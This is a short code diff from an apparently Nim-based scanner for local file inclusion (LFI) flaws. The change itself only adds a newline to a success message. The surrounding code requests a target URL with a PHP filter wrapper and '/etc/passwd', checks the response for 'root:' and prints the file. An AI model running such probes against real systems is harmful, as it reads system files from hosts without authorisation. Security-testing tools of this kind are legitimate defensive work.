@@ -41,7 +41,7 @@ proc testForLFI(url: string): bool =
   try:
     var plaintext = client.getContent(testUrl & "=" & phpfilter & "/etc/passwd").decode
     if "root:" in plaintext:
-      echo green "\u2713 LFI found in url. Successfully accessed /etc/passwd\n"
+      echo green "\n\u2713 LFI found in url. Successfully accessed /etc/passwd\n"
       echo plaintext
       return true
     else:
